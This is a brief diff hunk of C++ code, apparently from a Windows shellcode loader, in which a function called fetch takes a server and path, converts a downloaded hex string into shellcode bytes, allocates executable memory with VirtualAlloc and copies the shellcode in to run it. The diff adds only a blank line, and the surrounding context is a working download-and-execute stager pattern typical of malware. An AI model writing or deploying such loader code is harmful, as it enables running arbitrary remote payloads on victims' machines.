@@ -51,6 +51,7 @@ void fetch(string server, string path) {
 	for (int i = 0; i < shellcode_str.size() / 4; ++i) {
 		shellcode[i] = strtoul(shellcode_str.substr(i * 4 + 2, 2).c_str(), nullptr, 16);
 	}
+
 	// allocate memory and execute shellcode in memory
 	void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(exec, shellcode, sizeof(shellcode));
